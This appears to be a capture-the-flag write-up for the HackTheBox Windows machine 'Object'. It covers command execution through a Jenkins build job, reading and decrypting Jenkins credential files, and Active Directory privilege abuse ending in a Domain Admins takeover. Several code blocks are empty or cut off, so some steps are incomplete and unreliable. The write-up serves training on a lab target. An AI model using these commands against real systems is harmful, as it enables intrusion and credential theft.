{% include toc icon="cog" title="Object Solution" %}

The [Object](https://app.hackthebox.com/machines/Object) machine has been created by [MrR3boot](https://app.hackthebox.com/users/13531). This is an **hard** Windows Machine with a focus on Jenkins exploitation and Active Directory.

If you didn't solve this challenge and just look for answers, first, you should take a look at this [mind map](https://github.com/Orange-Cyberdefense/ocd-mindmaps/blob/main/img/pentest_ad_dark_2023_02.svg) from [Orange Cyberdefense](https://github.com/Orange-Cyberdefense) and try again. It could give you some hints about interesting attack paths when dealing with an Active Directory.

**Note:** All the actions performed against the target machine have been done with a standard *Kali Linux* machine. You can download Kali from the official website [here](https://www.kali.org/).

# Reconnaissance

In a penetration test or red team, reconnaissance consists of techniques that involve adversaries actively or passively gathering information that can be used to support targeting. 

This information can then be leveraged by an adversary to aid in other phases of the adversary lifecycle, such as using gathered information to plan and execute initial access, to scope and prioritize post-compromise objectives, or to drive and lead further reconnaissance efforts. Here, our only piece of information is an IP address. 

## Scan with Nmap

Let's start with a classic service scan with [Nmap](https://nmap.org/). Note the **-sV** switch which enables *version detection* and allows Nmap to check its internal database to try to determine the service protocol, application name and version number.

**Note:** Always allow a few minutes after the start of the HTB box to make sure that all the services are properly running. If you scan the machine right away, you may miss some ports that should be open.
{: .notice--info}

```bash
$ nmap -Pn -sV -p1-10000 10.129.96.147

```

**Remember:** By default, **Nmap** will scans the 1000 most common TCP ports on the targeted host(s). Make sure to read the [documentation](https://nmap.org/docs.html) if you need to scan more ports or change default behaviors.
{: .notice--warning}

Here we scanned the first 10000 TCP ports and discovered a few web services as well as a WinRM service running.

## HTTP Recon

If we check "http://10.129.96.147" we can see a link to the **automation** server leading to the domain **object.htb**.

![image-center](/images/htb/htb_object_website.png){: .align-center}

First, we will add the domain to our `/etc/hosts` file with the following command:
- `echo "10.129.96.147 object.htb" | sudo tee --append /etc/hosts`

Then, if we click on the link, we get redirected to "http://object.htb:8080". If we check the web site, we have a Jenkins login page.

![image-center](/images/htb/htb_object_jenkins.png){: .align-center}

While we don't have any credentials, we can create an account to get access to the Jenkins interface.

![image-center](/images/htb/htb_object_jenkins_create.png){: .align-center}

Nice! Let's see if we can get access to the server by exploiting Jenkins.

# Initial Access

In a real-world scenario, adversaries may search network shares on computers they have compromised to find files of interest. Sensitive data can be collected from remote systems via shared network drives. 

There are many [tricks](https://cloud.hacktricks.xyz/pentesting-ci-cd/jenkins-security) to exploit Jenkins, but first we will explore the application to see what kind of privileges we have.

## Exploiting Jenkins

Here, we will start by creating a new **Freestyle project**. 

![image-center](/images/htb/htb_object_jenkins_project.png){: .align-center}

While we can't trigger builds directly from the GUI, we could try to do it from the Jenkins API. First, let's enable **Trigger builds remotely** in *Configure > Build Triggers* and enter a random authentication token (here, **hello**).

![image-center](/images/htb/htb_object_jenkins_trigger.png){: .align-center}

Then, in **Build**, we can enter the command we want to execute. As a proof of concept, we will use `whoami` to see if we can trigger an execution on the server.

![image-center](/images/htb/htb_object_jenkins_command.png){: .align-center}

Now, in **API Token**, we will create a new token named **hello** and copy the generated token. This token will be used to trigger the job we configured earlier. The URL we will query will look like this:

- http://name:token@object.htb:8080/job/project_name/build?token=token_name

The query can be done with the [curl](https://curl.se) command.

```bash
$ curl http://ax:118b46e9ce4ade980e5b6b56130956d7d6@object.htb:8080/job/hello/build?token=hello
```

Back to the GUI, we can check if it worked by looking at the **Console Output**.

![image-center](/images/htb/htb_object_jenkins_result.png){: .align-center}

We got a result for `whoami` and as we can see we are running as **oliver**. Now, to recover the credentials from the different users on Jenkins, we need to know which users are using it. It can be done by modifying the command we are running with the following one:

```bash
cmd.exe /c "dir c:\Users\oliver\Appdata\local\jenkins\.jenkins\users"
```

Then, we just have to re-execute our previous `curl` command and check the result.

![image-center](/images/htb/htb_object_jenkins_result_2.png){: .align-center}

Here, we have a folder named **admin_17207690984073220035** which should contain a file named **config.xml** with credentials in it. Again, we will edit our build command, but this time with the following one:

```bash
cmd.exe /c "type c:\Users\oliver\Appdata\local\jenkins\.jenkins\users\admin_17207690984073220035\config.xml"
```

We should have a nice XML file with the encrypted password for **admin**.

```xml

```

To decrypt this password, we will use the following [script](https://raw.githubusercontent.com/gquere/pwn_jenkins/master/offline_decryption/jenkins_offline_decrypt.py) which requires 3 files:

- credentials.xml (the XML file we recovered)
- master.key (stored in **C:\Users\oliver\Appdata\local\jenkins\.jenkins\secrets**)
- hudson.util.Secret (same as the previous folder)

We can easily recover the missing files using the following command in our build configuration:

```bash
cmd.exe /c "type c:\Users\oliver\Appdata\local\jenkins\.jenkins\secrets\master.key"

powershell.exe -c "$c=[convert]::ToBase64String((Get-Content -path 'c:\Users\oliver\Appdata\local\jenkins\.jenkins\secrets\hudson.util.Secret' -Encoding byte));Write-Output $c"
```

Note that the **hudson.util.Secret** is a binary file so we need to encode it. Here is the **master.key** file:

```bash
f673fdb0c4fcc339070435bdbe1a039d83a597bf21eafbb7f9b35b50fce006e564cff456553ed73cb1fa568b68b310addc576f1637a7fe73414a4c6ff10b4e23adc538e9b369a0c6de8fc299dfa2a3904ec73a24aa48550b276be51f9165679595b2cac03cc2044f3c702d677169e2f4d3bd96d8321a2e19e2bf0c76fe31db19
```

Here is the **hudson.util.Secret** file in Base64:

```bash
gWFQFlTxi+xRdwcz6KgADwG+rsOAg2e3omR3LUopDXUcTQaGCJIswWKIbqgNXAvu2SHL93OiRbnEMeKqYe07PqnX9VWLh77Vtf+Z3jgJ7sa9v3hkJLPMWVUKqWsaMRHOkX30Qfa73XaWhe0ShIGsqROVDA1gS50ToDgNRIEXYRQWSeJY0gZELcUFIrS+r+2LAORHdFzxUeVfXcaalJ3HBhI+Si+pq85MKCcY3uxVpxSgnUrMB5MX4a18UrQ3iug9GHZQN4g6iETVf3u6FBFLSTiyxJ77IVWB1xgep5P66lgfEsqgUL9miuFFBzTsAkzcpBZeiPbwhyrhy/mCWogCddKudAJkHMqEISA3et9RIgA=
```

Now, we can decode **hudson.util.Secret**.

```bash
echo "gWFQFlTxi+xRdwcz6KgADwG+rsOAg2e3omR3LUopDXUcTQaGCJIswWKIbqgNXAvu2SHL93OiRbnEMeKqYe07PqnX9VWLh77Vtf+Z3jgJ7sa9v3hkJLPMWVUKqWsaMRHOkX30Qfa73XaWhe0ShIGsqROVDA1gS50ToDgNRIEXYRQWSeJY0gZELcUFIrS+r+2LAORHdFzxUeVfXcaalJ3HBhI+Si+pq85MKCcY3uxVpxSgnUrMB5MX4a18UrQ3iug9GHZQN4g6iETVf3u6FBFLSTiyxJ77IVWB1xgep5P66lgfEsqgUL9miuFFBzTsAkzcpBZeiPbwhyrhy/mCWogCddKudAJkHMqEISA3et9RIgA=" | base64 -d > hudson.util.Secret
```

We can execute our script to recover the password

```bash
$ python3 jenkins_offline_decrypt.py master.key hudson.util.Secret credentials.xml
c1cdfun_d2434
```

Awesome, let's see if we can connect to the remote machine with this password and the **oliver** username.

## WinRM Access

From a Linux machine, we can use [Evil-WinRM](https://github.com/Hackplayers/evil-winrm), a Ruby tool that implements Microsoft WS-Management Protocol, and the recovered account to connect to the remote machine and grab the **first flag**.

```bash
$ evil-winrm -i object.htb -u oliver -p c1cdfun_d2434                          

Evil-WinRM shell v3.4

```

Now, privilege escalation.

# Privilege Escalation

Privilege Escalation consists of techniques that adversaries use to gain higher-level permissions on a system or network. Adversaries can often enter and explore a network with unprivileged access but require elevated permissions to follow through on their objectives. Common approaches are to take advantage of system weaknesses, misconfigurations, and vulnerabilities.

## Active Directory Recon

With a valid account, we can now use one of the [BloodHound](https://github.com/BloodHoundAD/BloodHound) ingestors and gather more information about the Active Directory. BloodHound uses graph theory to reveal the hidden and often unintended relationships within an Active Directory or Azure environment. 

Attackers can use BloodHound to easily identify highly complex attack paths that would otherwise be impossible to quickly identify. Here, we uploaded and executed the [SharpHound](https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors) ingestor for BloodHound.

```bash
*Evil-WinRM* PS C:\Users\oliver\Documents> upload /home/ax/Downloads/SharpHound.exe

```

Once the process is done, we can download the produced ZIP file and analyze its content on our local machine.

```bash
*Evil-WinRM* PS C:\Users\oliver\Documents> download 20230428115712_BloodHound.zip
Info: Downloading 20230428115712_BloodHound.zip to ./20230428115712_BloodHound.zip

```

By looking at the BloodHound output, we can see that the **OLIVER@OBJECT.LOCAL** user can change the password (*ForceChangePassword*) of the **SMITH@OBJECT.LOCAL** user which has *GenericWrite* privileges over **MARIA@OBJECT.LOCAL**.

![image-center](/images/htb/htb_object_bloodhound.png){: .align-center}

Let's start by exploiting the relationship between **OLIVER@OBJECT.LOCAL** and **SMITH@OBJECT.LOCAL**.

## Lateral Movement

To abuse the *ForceChangePassword* privilege, we used a well-known PowerShell tool that aims to gain network situational awareness on Windows domains, [PowerView](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1).

Here, we just need to upload it to the remote machine and use the `Set-DomainUserPassword` command on **smith**.

```bash
*Evil-WinRM* PS C:\Users\oliver\Documents> upload /var/www/html/PowerView.ps1
Info: Uploading /var/www/html/PowerView.ps1 to C:\Users\oliver\Documents\PowerView.ps1
                                                             
Data: 1027036 bytes of 1027036 bytes copied

Info: Upload successful!

*Evil-WinRM* PS C:\Users\oliver\Documents> import-module .\PowerView.ps1
*Evil-WinRM* PS C:\Users\oliver\Documents> $UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
*Evil-WinRM* PS C:\Users\oliver\Documents> Set-DomainUserPassword -Identity smith -AccountPassword $UserPassword
*Evil-WinRM* PS C:\Users\oliver\Documents> exit
```

Now that we have changed the password of **smith**, we can use its credentials with `evil-winrm`.

```bash
$ evil-winrm -i object.htb -u smith -p 'Password123!'

Evil-WinRM shell v3.4

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\smith\Documents> 
```

Next, we know that **smith** has *GenericWrite* privileges over **MARIA@OBJECT.LOCAL**. This privilege allows us to modify user attributes. 

After looking around for a while and some internet research, we discovered that we could update the logon script for **maria**. You can check the following [post](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/acl-persistence-abuse#genericwrite-on-user) for some details. The main idea is that when **maria** logs into the machine, the script will be executed which could give us the ability to execute commands as **maria**.

To do this, we need a directory where any user can read or write. Here we could use **C:\ProgramData** as it does not require elevated permissions.

```bash
*Evil-WinRM* PS C:\Users\smith\Documents> ls -h c:\

    Directory: C:\

```

Now, let's see what **maria** has in its desktop folder.

```bash
*Evil-WinRM* PS C:\ProgramData> cd C:\Users\smith\Documents
*Evil-WinRM* PS C:\Users\smith\Documents> cd c:\ProgramData
*Evil-WinRM* PS C:\ProgramData> upload ../../var/www/html/PowerView.ps1

```

Interesting, there is a file named **Engines.xls**. Let's copy this file in **C:\ProgramData** and download it.

```bash
*Evil-WinRM* PS C:\ProgramData> echo "copy C:\Users\maria\Desktop\Engines.xls C:\ProgramData\" > script.ps1
*Evil-WinRM* PS C:\ProgramData> download Engines.xls

```

The file seems to contain multiple passwords for **maria**. 

![image-center](/images/htb/htb_object_excel.png){: .align-center}

We can try to do a quick password spray to see if yield any results.

```bash

Nice! We got a valid password.

```bash
$ evil-winrm -i 10.129.96.147 -u maria -p W3llcr4ft3d_4cls

## Abusing WriteOwner Privileges

The user **MARIA@OBJECT.LOCAL** has the ability to modify the owner of the group **DOMAIN ADMINS@OBJECT.LOCAL** which means that we have the ability to modify object security descriptors. With these privileges we can set the owner of the Domain Admins group to **maria**.

```bash
*Evil-WinRM* PS C:\Users\maria\Documents> upload ../../var/www/html/PowerView.ps1

*Evil-WinRM* PS C:\Users\maria\Documents> net group "Domain Admins" maria /add /domain
The command completed successfully.
```

Now, we just have to logout and log back in to get our new privileges and grab the **second flag**.

```bash
$ evil-winrm -i 10.129.96.147 -u maria -p W3llcr4ft3d_4cls
